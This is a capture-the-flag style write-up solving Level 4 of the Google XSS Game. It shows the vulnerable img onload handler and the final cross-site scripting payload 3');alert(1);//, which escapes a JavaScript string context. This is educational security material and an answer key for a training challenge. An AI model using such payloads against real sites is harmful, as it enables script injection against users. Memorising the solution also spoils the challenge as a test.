```markdown
### 🧪 Google XSS Game - Level 4

#### 🎯 Mission Description
Every piece of user-supplied data must be properly escaped depending on the context it's placed in. This level shows why that matters.

#### 🎯 Mission Objective
Inject JavaScript code that triggers an `alert()` popup.

---
```
### 🪜 Steps

- We checked the source code and found this line:

  ```html
  <img src="/static/loading.gif" onload="startTimer('3');" />
  

- This is where we’ll inject our payload — specifically inside the `onload` attribute.

- First attempt was:

  ```
  X">x
  ```

  Which resulted in:

  ```html
  <img src="/static/loading.gif" onload="startTimer('X&quot;&gt;x');" />
  ```

  So the special characters were escaped, and the attempt failed.

- Instead, we decided to break the `startTimer()` function itself and inject our code inside the JavaScript context.

- First, we closed the string and function with:

  ```
  3');
  ```

- Then injected:

  ```
  alert(1);
  ```

- And finally closed off the rest of the line using:

  ```
  //
  ```

---

### 💣 Final Payload

```
3');alert(1);//
```

And it gets rendered as:

```html
<img src="/static/loading.gif" onload="startTimer('3');alert(1);//');" />
```

---

### 🧠 Notes

- This is an example of XSS within JavaScript context.
- You don’t always need to break out of an HTML attribute — sometimes injecting inside the script logic itself is more effective.
- Always analyze the context of the injection point before crafting your payload.

---

**Status: Solved ✅**
```
